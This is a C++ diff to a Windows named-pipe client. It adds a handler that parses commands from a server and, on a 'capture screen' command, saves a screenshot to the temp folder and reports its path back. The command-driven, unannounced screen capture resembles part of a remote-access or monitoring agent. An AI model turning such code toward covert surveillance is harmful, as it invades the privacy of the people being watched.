@@ -1,6 +1,7 @@
 #include "PipeConnection.h"
 #include <windows.h>
 #include <iostream>
+#include "CaptureScreen.h"
 
 
 PipeConnection::PipeConnection() {
@@ -90,7 +91,35 @@ bool PipeConnection::InitPipe()
 		}
 
 		response[bytesRead / sizeof(wchar_t)] = L'\0';
-		MessageBoxW(NULL, response, L"Pipe Message", MB_OK | MB_ICONINFORMATION);
+		wprintf(L"response: %ws\n", response);
+		std::wstring message(response);
+		size_t sep1 = message.find(L'|');
+		if (sep1 != std::wstring::npos) {
+			std::wstring command = message.substr(0, sep1);
+			std::wcout << L"Received command: " << command << std::endl;
+			if (command == std::wstring(CAPTURESCREEN_LABEL)) {
+				std::wstring command_id = message.substr(sep1 + 1);
+				std::wcout << L"Capture screen command ID: " << command_id << std::endl;
+				char tempPath[MAX_PATH];
+				GetTempPathA(MAX_PATH, tempPath);
+				std::string full = std::string(tempPath) + "screenshot_tmp.jpg";
+				if (CaptureScreen(full.c_str())) {
+					std::wstring message = std::wstring(CAPTURESCREEN_LABEL) + L"|" + command_id + L"|" + std::wstring(full.begin(), full.end()) + L"\0";
+					SendMessageToServer(message);
+				}
+				else {
+					std::wcout << L"Failed to capture screen." << std::endl;
+				}
+			}
+			else {
+				std::wcout << L"Received unknown command: " << command << std::endl;
+			}
+		}
+		else {
+			std::wcout << L"Received malformed message: " << message << std::endl;
+		}
+
+		//MessageBoxW(NULL, response, L"Pipe Message", MB_OK | MB_ICONINFORMATION);
 	}
 
 
